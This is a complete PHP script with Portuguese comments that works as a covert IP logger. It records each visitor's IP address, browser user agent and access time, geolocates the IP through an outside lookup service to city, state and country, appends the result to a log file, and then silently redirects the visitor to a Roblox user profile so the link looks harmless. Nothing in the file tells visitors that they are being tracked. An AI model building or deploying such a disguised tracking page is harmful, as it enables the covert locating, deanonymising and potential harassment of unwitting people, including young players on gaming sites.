<?php
// Define o fuso horário do Brasil
date_default_timezone_set('America/Sao_Paulo');

// Captura o IP do visitante
$ip = $_SERVER['REMOTE_ADDR'];

// Captura o User-Agent do visitante
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Captura a data e hora do acesso (em horário de Brasília)
$data = date("Y-m-d H:i:s");

// API para buscar localização aproximada com base no IP
$location = "Localização desconhecida";

$apiResponse = @file_get_contents("http://ip-api.com/json/$ip?lang=pt");
if ($apiResponse !== false) {
    $json = json_decode($apiResponse, true);
    if ($json && $json['status'] === 'success') {
        $cidade = $json['city'];
        $estado = $json['regionName'];
        $pais = $json['country'];
        $location = "$cidade, $estado, $pais";
    }
}

// Monta a linha para salvar
$linha = "IP: $ip - Acessado em: $data - Local: $location - User-Agent: $userAgent\n";

// Salva no arquivo logs.txt
file_put_contents("logs.txt", $linha, FILE_APPEND);

// Redireciona para algum site
header("Location: https://www.roblox.com/pt/users/76/profile?friendshipSourceType=PlayerSearch#!/about");
exit();
?>

